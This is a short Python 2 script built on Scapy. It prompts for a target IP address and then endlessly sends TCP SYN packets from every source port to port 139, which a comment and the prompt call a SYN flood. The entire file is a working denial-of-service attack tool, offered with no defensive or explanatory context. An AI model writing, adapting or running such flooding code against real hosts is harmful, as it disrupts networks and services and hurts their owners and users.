import sys
from scapy.all import *

IP_input = raw_input("Please enter an IP address for SYN flood: ")
print "You entered: ", IP_input

while True:
    #TCP SYN (header flags: 0x02) packets from all TCP ports to port 139
	pkts = IP(dst=IP_input) / TCP(sport=(1,65535), dport=139, flags=0x02)
	sr(pkts)
